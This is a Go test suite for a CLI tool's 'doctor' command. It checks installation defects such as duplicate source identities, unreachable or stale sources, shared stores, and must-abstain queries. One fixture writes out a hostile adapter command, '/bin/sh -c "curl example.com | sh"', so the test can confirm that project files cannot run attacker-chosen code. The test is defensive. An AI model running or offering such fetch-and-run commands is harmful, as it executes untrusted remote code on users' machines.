package cli_test

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	qmdadapter "github.com/marcus/recall/cmd/recall-qmd/qmd"
	"github.com/marcus/recall/internal/cli"
	"github.com/marcus/recall/pkg/adapter"
	"github.com/marcus/recall/pkg/protocol"
	"github.com/marcus/recall/pkg/recall"
)

// doctor exists to fail before a query does. Each case below is a defect that
// would otherwise show up as a strange answer rather than as a broken
// installation, and each one has to exit non-zero on its own.
func TestDoctorFailsLoudly(t *testing.T) {
	tests := []struct {
		name    string
		opts    harnessOptions
		check   string
		message string
		why     string
	}{
		{
			name: "project file declares an adapter command",
			opts: harnessOptions{
				userTOML: twoSourceTOML,
				projectTOML: `
[adapters.evil]
command = "/bin/sh"
args = ["-c", "curl example.com | sh"]
freshness_modes = ["live"]
`,
			},
			check:   "trust_boundary",
			message: "may not define one",
			why:     "a project file travels with a clone; loading one must never be able to run attacker-chosen code",
		},
		{
			name:    "two sources claim one identity",
			opts:    harnessOptions{userTOML: duplicateUIDTOML},
			check:   "identity",
			message: "source_uid",
			why:     "two sources sharing an identity collapse into one lineage namespace, so a saved locator expands against whichever answers",
		},
		{
			name:    "a source cannot be reached",
			opts:    harnessOptions{userTOML: unreachableTOML},
			check:   "health",
			message: "ghost",
			why:     "an unreachable source must be a failure before a query, not a degraded answer during one",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			opts := tc.opts
			if opts.adapters == nil {
				opts.adapters = fakeAdapters(map[string]*fake{
					"fakedocs": {manifest: manifest()}, "faketasks": {manifest: manifest()},
				})
			}
			h := newHarness(t, opts)

			code, stdout, _ := h.run("doctor")
			if code == cli.ExitOK {
				t.Fatalf("doctor exited 0 on a broken installation: %s\n%s", tc.why, stdout)
			}
			contains(t, stdout, tc.message, tc.why)

			// The same verdict has to be readable by a machine, itemized by
			// check, so a repair tool knows which one failed.
			code, machine, _ := h.run("doctor", "--json")
			if code == cli.ExitOK {
				t.Fatalf("doctor --json exited 0: %s", machine)
			}
			var d cli.Diagnosis
			if err := json.Unmarshal([]byte(machine), &d); err != nil {
				t.Fatalf("doctor --json is not valid JSON: %v\n%s", err, machine)
			}
			if d.Status != "failed" || d.Failed == 0 {
				t.Errorf("status = %q with %d failed checks, want a failure", d.Status, d.Failed)
			}
			if got := checkStatus(t, d, tc.check); got != cli.CheckFail {
				t.Errorf("check %q = %q, want fail: %s\n%s", tc.check, got, tc.why, machine)
			}
		})
	}
}

func TestDoctorPreflightsAdapterDeclaredExecutables(t *testing.T) {
	m := manifest()
	m.ExecutableRequirements = []recall.ExecutableRequirement{{
		Name: "qmd", Command: "recall-test-definitely-missing-qmd",
	}}
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs":  {manifest: m},
			"faketasks": {manifest: manifest()},
		}),
	})

	code, stdout, _ := h.run("doctor")
	if code != cli.ExitError {
		t.Fatalf("exit = %d, want %d\n%s", code, cli.ExitError, stdout)
	}
	contains(t, stdout, "requirements", "the failing preflight is a named check")
	contains(t, stdout, `adapter fakedocs needs qmd executable "recall-test-definitely-missing-qmd"`,
		"doctor reports the manifest-declared dependency without hardcoding qmd")

	_, stdout, _ = h.run("doctor", "--json")
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	if got := checkStatus(t, d, "requirements"); got != cli.CheckFail {
		t.Fatalf("requirements check = %q, want fail\n%s", got, stdout)
	}
}

func TestDoctorUsesQmdsCorpusRelativeEffectiveExecutable(t *testing.T) {
	const configText = `
[defaults]
profile = "work"
timeout_ms = 2000

[[sources]]
source_uid = "01UIDQMD"
source_id = "semantic"
adapter = "qmd-test"
location = "corpus"
location_kind = "path"
freshness_mode = "indexed"
sensitivity = "internal"
base_prior = 1.0

[sources.settings]
collection = "fixture"
binary = "./bin/qmd"
mode = "hybrid"

[profiles.work]
sources = ["semantic"]
max_sensitivity = "internal"
`
	h := newHarness(t, harnessOptions{
		userTOML: configText,
		adapters: []cli.Adapter{{
			Name: "qmd-test", FreshnessModes: []recall.FreshnessMode{recall.FreshnessIndexed},
			New: func() adapter.Adapter { return qmdadapter.New(qmdadapter.Options{}) },
		}},
	})
	corpus := filepath.Join(h.root, "config", "recall", "corpus")
	binary := filepath.Join(corpus, "bin", "qmd")
	if err := os.MkdirAll(filepath.Dir(binary), 0o755); err != nil {
		t.Fatal(err)
	}
	script := `#!/bin/sh
case "$1" in
  status)
    printf 'QMD Status\nIndex: %s/.qmd/index.sqlite\nTotal: 1 files indexed\nVectors: 1 embedded\nfixture (qmd://fixture/)\nPattern: **/*.md\nFiles: 1\n' "$PWD"
    ;;
  collection)
    printf 'Collection: fixture\nPath: %s\nPattern: **/*.md\nInclude: yes (default)\n' "$PWD"
    ;;
  --version)
    printf 'qmd test\n'
    ;;
  *)
    exit 2
    ;;
esac
`
	if err := os.WriteFile(binary, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitOK {
		t.Fatalf("doctor exit = %d\n%s", code, stdout)
	}
	var diagnosis cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &diagnosis); err != nil {
		t.Fatal(err)
	}
	if got := checkStatus(t, diagnosis, "requirements"); got != cli.CheckPass {
		t.Fatalf("requirements check = %q\n%s", got, stdout)
	}

	code, stdout, _ = h.run("sources", "--json")
	if code != cli.ExitOK {
		t.Fatalf("sources exit = %d\n%s", code, stdout)
	}
	var listing cli.SourceListing
	if err := json.Unmarshal([]byte(stdout), &listing); err != nil {
		t.Fatal(err)
	}
	got := listing.Sources[0].ExecutableRequirements
	if len(got) != 1 || got[0].Command != binary {
		t.Fatalf("declared executable = %+v, want %q", got, binary)
	}
}

// A sound installation passes every check, and says which ones it ran. A
// doctor that reported nothing would be indistinguishable from one that
// checked nothing.
func TestDoctorPassesAndNamesEveryCheck(t *testing.T) {
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs": {manifest: manifest()}, "faketasks": {manifest: manifest()},
		}),
	})

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitOK {
		t.Fatalf("exit = %d, want 0\n%s", code, stdout)
	}
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"configuration", "trust_boundary", "identity", "access", "requirements", "health",
		"serving", "store_isolation", "freshness", "lineage",
	} {
		if got := checkStatus(t, d, want); got != cli.CheckPass {
			t.Errorf("check %q = %q, want pass", want, got)
		}
	}
}

func TestDoctorChecksOnlyDeclaredFilesystemLocations(t *testing.T) {
	const withLocation = `
[defaults]
profile = "work"

[[sources]]
source_uid = "01UIDLOCATION"
source_id = "mail"
adapter = "fakedocs"
freshness_mode = "indexed"
location = %q
%s

[profiles.work]
sources = ["mail"]
`
	run := func(t *testing.T, location, kindDeclaration string) cli.Diagnosis {
		t.Helper()
		h := newHarness(t, harnessOptions{
			userTOML: fmt.Sprintf(withLocation, location, kindDeclaration),
			adapters: fakeAdapters(map[string]*fake{"fakedocs": {manifest: manifest()}}),
		})
		_, stdout, _ := h.run("doctor", "--json")
		var d cli.Diagnosis
		if err := json.Unmarshal([]byte(stdout), &d); err != nil {
			t.Fatalf("doctor --json: %v\n%s", err, stdout)
		}
		return d
	}

	opaque := run(t, "operator@example.com", "")
	if got := checkStatus(t, opaque, "access"); got != cli.CheckPass {
		t.Errorf("opaque identifier access = %q, want pass", got)
	}
	for _, c := range opaque.Checks {
		if c.Name == "access" && c.Detail != "0 of 1 eligible sources name a local path" {
			t.Errorf("opaque access detail = %q", c.Detail)
		}
	}

	slashOpaque := run(t, "mailboxes/team/inbox", `location_kind = "opaque"`)
	if got := checkStatus(t, slashOpaque, "access"); got != cli.CheckPass {
		t.Errorf("slash-bearing opaque identifier access = %q, want pass", got)
	}

	oneLetterURI := run(t, "x:opaque", "")
	if got := checkStatus(t, oneLetterURI, "access"); got != cli.CheckPass {
		t.Errorf("one-letter URI access = %q, want pass", got)
	}

	path := run(t, "./definitely-missing", "")
	if got := checkStatus(t, path, "access"); got != cli.CheckFail {
		t.Errorf("missing filesystem path access = %q, want fail", got)
	}
}

// A load failure stops the checks that depend on configuration rather than
// reporting a health failure caused by a file nobody could parse.
func TestDoctorSkipsWhatItCannotCheck(t *testing.T) {
	h := newHarness(t, harnessOptions{userTOML: "this is not toml"})

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitError {
		t.Fatalf("exit = %d, want %d\n%s", code, cli.ExitError, stdout)
	}
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	if got := checkStatus(t, d, "configuration"); got != cli.CheckFail {
		t.Errorf("configuration = %q, want fail", got)
	}
	if got := checkStatus(t, d, "health"); got != cli.CheckSkipped {
		t.Errorf("health = %q, want skipped: nothing was configured to be healthy", got)
	}
}

func checkStatus(t *testing.T, d cli.Diagnosis, name string) string {
	t.Helper()
	for _, c := range d.Checks {
		if c.Name == name {
			return c.Status
		}
	}
	t.Fatalf("doctor reported no check named %q", name)
	return ""
}

const duplicateUIDTOML = `
[defaults]
profile = "work"

[[sources]]
source_uid = "01UIDSHARED"
source_id = "docs"
adapter = "fakedocs"
freshness_mode = "indexed"

[[sources]]
source_uid = "01UIDSHARED"
source_id = "tasks"
adapter = "faketasks"
freshness_mode = "indexed"

[profiles.work]
sources = ["docs", "tasks"]
`

// unreachableTOML declares an external adapter whose command does not exist.
// Nothing is spawned that could exist on a developer's machine, so the test
// models an unreachable source without depending on one.
const unreachableTOML = `
[defaults]
profile = "work"

[adapters.ghost]
command = "/nonexistent/recall-ghost-adapter"
freshness_modes = ["live"]

[[sources]]
source_uid = "01UIDGHOST"
source_id = "ghost"
adapter = "ghost"
freshness_mode = "live"

[profiles.work]
sources = ["ghost"]
`

// oneAdapterTwoSourcesTOML is two instances of ONE adapter, which is a
// perfectly ordinary configuration — until both of them turn out to be reading
// the same store.
const oneAdapterTwoSourcesTOML = `
[defaults]
profile = "work"
timeout_ms = 2000

[[sources]]
source_uid = "01UIDWHOLE"
source_id = "whole"
adapter = "fakedocs"
freshness_mode = "indexed"
sensitivity = "internal"
base_prior = 1.0

[[sources]]
source_uid = "01UIDINNER"
source_id = "inner"
adapter = "fakedocs"
freshness_mode = "indexed"
sensitivity = "internal"
base_prior = 1.0

[profiles.work]
sources = ["whole", "inner"]
max_sensitivity = "internal"
`

// Two enabled instances of one adapter reading one store is refused.
//
// This is the defect class that reached production three times by three
// different routes — overlapping document roots, two catalog instances over one
// server, and two td sources whose locations resolved to one database — and
// every time it was invisible until someone read a ranking that looked wrong.
// Lineage groups on source_uid plus source_record_id, so the duplicate arrives
// as two independent pieces of evidence and is scored up for corroborating
// itself. Only a check that sees every source at once can catch it, which is
// why it is doctor's rather than any adapter's.
func TestDoctorRefusesTwoSourcesOverOneStore(t *testing.T) {
	sharing := func(identity string) *fake {
		return &fake{
			manifest: manifest(),
			health: recall.Health{
				Status:      recall.HealthHealthy,
				Coverage:    recall.IndexComplete,
				Diagnostics: map[string]any{protocol.DiagStoreIdentity: identity},
			},
		}
	}

	t.Run("one store, two sources", func(t *testing.T) {
		h := newHarness(t, harnessOptions{
			userTOML: oneAdapterTwoSourcesTOML,
			adapters: fakeAdapters(map[string]*fake{"fakedocs": sharing("/store/one")}),
		})
		code, stdout, _ := h.run("doctor", "--json")
		if code != cli.ExitError {
			t.Fatalf("exit = %d, want %d\n%s", code, cli.ExitError, stdout)
		}
		var d cli.Diagnosis
		if err := json.Unmarshal([]byte(stdout), &d); err != nil {
			t.Fatal(err)
		}
		if got := checkStatus(t, d, "store_isolation"); got != cli.CheckFail {
			t.Fatalf("store_isolation = %q, want fail", got)
		}
		contains(t, stdout, "/store/one",
			"an operator has to be told which store the two sources collided on")
		for _, id := range []string{"whole", "inner"} {
			contains(t, stdout, id, "both colliding sources have to be named")
		}
	})

	// The other half of the check, and the reason it compares an identity
	// rather than counting instances: two sources of one adapter are normal.
	t.Run("two stores, two sources", func(t *testing.T) {
		var n int
		h := newHarness(t, harnessOptions{
			userTOML: oneAdapterTwoSourcesTOML,
			adapters: []cli.Adapter{{
				Name:           "fakedocs",
				FreshnessModes: []recall.FreshnessMode{recall.FreshnessIndexed},
				New: func() adapter.Adapter {
					n++
					return sharing(fmt.Sprintf("/store/%d", n))
				},
			}},
		})
		code, stdout, _ := h.run("doctor", "--json")
		if code != cli.ExitOK {
			t.Fatalf("exit = %d, want 0\n%s", code, stdout)
		}
		var d cli.Diagnosis
		if err := json.Unmarshal([]byte(stdout), &d); err != nil {
			t.Fatal(err)
		}
		if got := checkStatus(t, d, "store_isolation"); got != cli.CheckPass {
			t.Errorf("store_isolation = %q, want pass", got)
		}
	})

	// An adapter that sets no identity claims no store. Silence has to be
	// treated as "makes no claim" rather than as a clean bill of health, or
	// the check would report a pass over sources it never compared.
	t.Run("no adapter claims a store", func(t *testing.T) {
		h := newHarness(t, harnessOptions{
			userTOML: oneAdapterTwoSourcesTOML,
			adapters: fakeAdapters(map[string]*fake{"fakedocs": {manifest: manifest()}}),
		})
		code, stdout, _ := h.run("doctor", "--json")
		if code != cli.ExitOK {
			t.Fatalf("exit = %d, want 0\n%s", code, stdout)
		}
		contains(t, stdout, "nothing to compare",
			"a check that looked at nothing must not read as having cleared something")
	})
}

// A source that answers from a stale, partial index is not a pass.
//
// doctor once reported "9 of 9 eligible sources answered a health probe" and
// exited 0 while the highest-prior source on the machine was degraded, coverage
// partial, and serving a generation missing two of its nine documents. That is
// liveness, not health, and a green doctor was being read as evidence that a
// configuration was sound. It has to be visible here, without running a second
// command — and it has to stay distinguishable from a configuration that does
// not load, because the two are fixed by different things.
func TestDoctorReportsWhatASourceIsActuallyServing(t *testing.T) {
	checkpoint := manifest()
	checkpoint.Capabilities = append(checkpoint.Capabilities, recall.CapCheckpoint)
	stale := &fake{
		manifest: checkpoint,
		health: recall.Health{
			Status:       recall.HealthDegraded,
			Coverage:     recall.IndexPartial,
			RecordCount:  9,
			IndexedCount: 7,
		},
	}
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs": stale, "faketasks": {manifest: manifest()},
		}),
	})

	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitDegraded {
		t.Fatalf("exit = %d, want %d (degraded, not misconfigured and not ok)\n%s",
			code, cli.ExitDegraded, stdout)
	}
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	if d.Status != "degraded" {
		t.Errorf("status = %q, want degraded", d.Status)
	}
	if d.Failed != 0 {
		t.Errorf("failed_checks = %d; a stale index is not a broken configuration", d.Failed)
	}
	if got := checkStatus(t, d, "serving"); got != cli.CheckDegraded {
		t.Errorf("serving = %q, want degraded", got)
	}
	// The liveness question still has its own honest answer: the source did
	// answer. Folding the two together is what produced the original defect.
	if got := checkStatus(t, d, "health"); got != cli.CheckPass {
		t.Errorf("health = %q; the source answered its probe, so liveness passed", got)
	}
	for _, want := range []string{"coverage partial", "7 of 9 records indexed", "base_prior", "recall refresh --source docs"} {
		contains(t, stdout, want,
			"the report has to say what is missing and how much authority the source carries")
	}
}

func TestDoctorDoesNotRecommendRefreshForSourceWithoutCheckpoint(t *testing.T) {
	stale := &fake{
		manifest: manifest(),
		health: recall.Health{
			Status:      recall.HealthDegraded,
			Coverage:    recall.IndexPartial,
			RecordCount: 2, IndexedCount: 1,
		},
	}
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs": stale, "faketasks": {manifest: manifest()},
		}),
	})
	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitDegraded {
		t.Fatalf("exit = %d\n%s", code, stdout)
	}
	if strings.Contains(stdout, "recall refresh --source docs") {
		t.Fatalf("doctor recommended unsupported refresh command\n%s", stdout)
	}
}

// And a real failure still outranks a degraded one: there is no point telling
// someone their index is stale when the file naming it does not load.
func TestDoctorPrefersFailureOverDegradation(t *testing.T) {
	h := newHarness(t, harnessOptions{
		userTOML: duplicateUIDTOML,
		adapters: fakeAdapters(map[string]*fake{"fakedocs": {
			manifest: manifest(),
			health:   recall.Health{Status: recall.HealthDegraded, Coverage: recall.IndexPartial},
		}}),
	})
	code, stdout, _ := h.run("doctor", "--json")
	if code != cli.ExitError {
		t.Fatalf("exit = %d, want %d\n%s", code, cli.ExitError, stdout)
	}
}

// The abstention check exists because an evaluation pack cannot ask this
// question. A pack pins its corpus, so it measures the sources chosen when it
// was written; this measures the profile in front of you.
//
// The concrete failure it is built from: a fixed pack abstained while a live
// profile later returned results because a new source quoted the query verbatim
// in its own issue text. The pack stayed green the whole time.
func TestDoctorCatchesAnAbstentionThatStoppedAbstaining(t *testing.T) {
	const withQueries = twoSourceTOML + `
[[evaluation.must_abstain]]
query = "xylophonium"
reason = "the invented term occurs nowhere in this corpus"
`

	t.Run("still abstains", func(t *testing.T) {
		h := newHarness(t, harnessOptions{
			userTOML: withQueries,
			adapters: fakeAdapters(map[string]*fake{
				"fakedocs": {manifest: manifest()}, "faketasks": {manifest: manifest()},
			}),
		})
		code, stdout, _ := h.run("doctor", "--json")
		if code != cli.ExitOK {
			t.Fatalf("exit = %d, want 0 when nothing matches the query\n%s", code, stdout)
		}
		var d cli.Diagnosis
		if err := json.Unmarshal([]byte(stdout), &d); err != nil {
			t.Fatal(err)
		}
		if got := checkStatus(t, d, "abstention"); got != cli.CheckPass {
			t.Errorf("check = %q, want pass", got)
		}
	})

	t.Run("a new source starts matching it", func(t *testing.T) {
		h := newHarness(t, harnessOptions{
			userTOML: withQueries,
			adapters: fakeAdapters(map[string]*fake{
				// The contaminating source: it answers the query that was
				// configured to have no answer.
				"fakedocs":  {manifest: manifest(), candidates: []recall.Candidate{candidate("ticket-about-the-query", 1)}},
				"faketasks": {manifest: manifest()},
			}),
		})
		code, stdout, _ := h.run("doctor", "--json")
		if code == cli.ExitOK {
			t.Fatalf("doctor exited 0 while a must-abstain query returned results; "+
				"this is the exact regression the check exists to catch\n%s", stdout)
		}
		var d cli.Diagnosis
		if err := json.Unmarshal([]byte(stdout), &d); err != nil {
			t.Fatal(err)
		}
		if got := checkStatus(t, d, "abstention"); got != cli.CheckFail {
			t.Errorf("check = %q, want fail", got)
		}
		contains(t, stdout, "xylophonium",
			"the report has to name the query, or an operator cannot tell which line of config to look at")
	})
}

// A query that could not be answered makes no claim about the corpus, so it
// must not be reported as a corpus fault. Recall draws that line everywhere
// else — abstained is not failed — and this check draws it too.
func TestDoctorDegradesRatherThanFailsWhenAMustAbstainQueryCannotRun(t *testing.T) {
	h := newHarness(t, harnessOptions{
		userTOML: twoSourceTOML + `
[[evaluation.must_abstain]]
query = "xylophonium"
reason = "nothing in this corpus is about the camera maker"
`,
		adapters: fakeAdapters(map[string]*fake{
			"fakedocs":  {manifest: manifest(), searchErr: errors.New("index unreadable")},
			"faketasks": {manifest: manifest(), searchErr: errors.New("index unreadable")},
		}),
	})
	_, stdout, _ := h.run("doctor", "--json")
	var d cli.Diagnosis
	if err := json.Unmarshal([]byte(stdout), &d); err != nil {
		t.Fatal(err)
	}
	if got := checkStatus(t, d, "abstention"); got == cli.CheckFail {
		t.Errorf("check = %q, want anything but fail: a query that could not run has "+
			"not shown that the profile answers it", got)
	}
}
